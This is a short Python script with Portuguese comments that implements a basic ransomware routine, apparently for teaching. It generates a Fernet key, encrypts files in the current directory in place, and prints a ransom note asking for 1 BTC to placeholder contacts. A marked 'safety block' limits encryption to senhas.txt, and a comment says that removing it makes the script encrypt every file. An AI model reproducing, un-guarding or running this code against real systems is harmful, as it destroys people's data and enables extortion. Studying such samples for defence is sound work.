#!/usr/bin/env python3

from cryptography.fernet import Fernet
# Importa a biblioteca Fernet, que fornece criptografia simétrica segura.

import os
# Importa o módulo os para manipulação de arquivos e diretórios.


def write_key():
    # Função responsável por gerar e salvar uma chave de criptografia.
    key = Fernet.generate_key()  # Gera uma chave aleatória.
    # Cria/abre o arquivo key.txt em modo binário.
    with open("key.txt", "wb") as key_file:
        key_file.write(key)  # Escreve a chave no arquivo.


def encrypt_file(file_name, key):
    # Função que criptografa um arquivo usando a chave fornecida.
    fernet = Fernet(key)  # Inicializa o objeto Fernet com a chave.
    # Abre o arquivo original em modo leitura binária.
    with open(file_name, 'rb') as file:
        original = file.read()  # Lê o conteúdo do arquivo.
    encrypted = fernet.encrypt(original)  # Criptografa o conteúdo.
    # Reabre o arquivo em modo escrita binária.
    with open(file_name, 'wb') as encrypted_file:
        # Sobrescreve com o conteúdo criptografado.
        encrypted_file.write(encrypted)


if __name__ == "__main__":
    # Ponto de entrada principal do script.
    write_key()  # Gera e salva a chave de criptografia.
    for files in os.listdir():  # Itera sobre todos os arquivos do diretório atual.
        if files.lower() in ["key.txt", "requirements.txt"] \
           or files.lower().endswith((".py", ".exe")) \
           or os.path.isdir(files):
            # Ignora arquivos críticos (como a chave, scripts Python, executáveis e diretórios).
            continue

        ### BLOCO DE SEGURANÇA ###
        # Utilizar em ambiente controlado apenas para testes. Risco de perda de dados!!!
        elif files.lower() not in ["senhas.txt"]:
            # Apenas o arquivo "senhas.txt" será criptografado.
            continue
        # CUIDADO: Caso este bloco seja removido, o script irá criptografar todos os arquivos no diretório!
        ### FIM DO BLOCO DE SEGURANÇA ###

        # Exibe mensagem indicando qual arquivo está sendo criptografado.
        print(f"Criptografando {files}...")
        # Lê a chave salva anteriormente.
        with open("key.txt", "rb") as key_file:
            key = key_file.read()
            encrypt_file(files, key)  # Criptografa o arquivo selecionado.

    print("""
Seus arquivos foram criptografados!!!
Para recuperá-los, envie um 1 BTC para CHAVE_BTC e envie um email para EMAIL@DOMINIO.COM com o comprovante de pagamento.""")
    # Mensagem típica de ransomware exigindo pagamento para liberar os arquivos.
